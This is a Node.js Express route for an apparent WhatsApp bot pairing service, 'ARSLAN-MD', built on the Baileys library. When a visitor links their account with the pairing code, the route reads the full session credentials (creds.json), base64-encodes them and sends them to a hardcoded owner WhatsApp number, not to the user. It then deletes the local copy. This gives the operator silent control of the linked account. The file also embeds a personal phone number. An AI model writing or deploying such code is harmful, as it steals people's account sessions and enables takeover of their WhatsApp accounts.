import { default as makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import express from 'express';

const router = express.Router();

router.get('/', async (req, res) => {
    let num = req.query.num;
    if (!num) {
        return res.json({ error: "Phone number is required!" });
    }
    num = num.replace(/[^0-9]/g, '');

    const sessionPath = path.join('./session_' + Date.now());

    try {
        const { version } = await fetchLatestBaileysVersion();
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

        const sock = makeWASocket({
            version,
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ["ARSLAN-MD-PAIR", "Chrome", "1.0.0"]
        });

        sock.ev.on('creds.update', saveCreds);

        if (!sock.authState.creds.registered) {
            setTimeout(async () => {
                try {
                    let code = await sock.requestPairingCode(num);
                    let formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                    return res.json({ status: true, code: formattedCode });
                } catch (err) {
                    return res.json({ error: "Failed to get pairing code." });
                }
            }, 3000);
        }

        // Jab connect ho jaye to Session ID nikal kar owner ko WhatsApp par bhej de
        sock.ev.on('connection.update', async (update) => {
            const { connection } = update;
            if (connection === 'open') {
                try {
                    const credsPath = path.join(sessionPath, 'creds.json');
                    if (fs.existsSync(credsPath)) {
                        const credsData = fs.readFileSync(credsPath, 'utf8');
                        const base64Session = Buffer.from(credsData).toString('base64');
                        
                        // Owner ko WhatsApp par Session ID send karna
                        const ownerJid = "923467214839@s.whatsapp.net"; // Aapka number
                        await sock.sendMessage(ownerJid, { 
                            text: `💜 *ARSLAN-MD NEW SESSION ID* 💜\n\n\`\`\`${base64Session}\`\`\`` 
                        });
                    }
                } catch (e) {
                    console.log("Error sending session to WhatsApp:", e);
                }

                // Folder delete kar dena safai ke liye
                setTimeout(() => {
                    fs.rmSync(sessionPath, { recursive: true, force: true });
                }, 10000);
            }
        });

    } catch (err) {
        return res.json({ error: "Server Error!" });
    }
});

export default router;
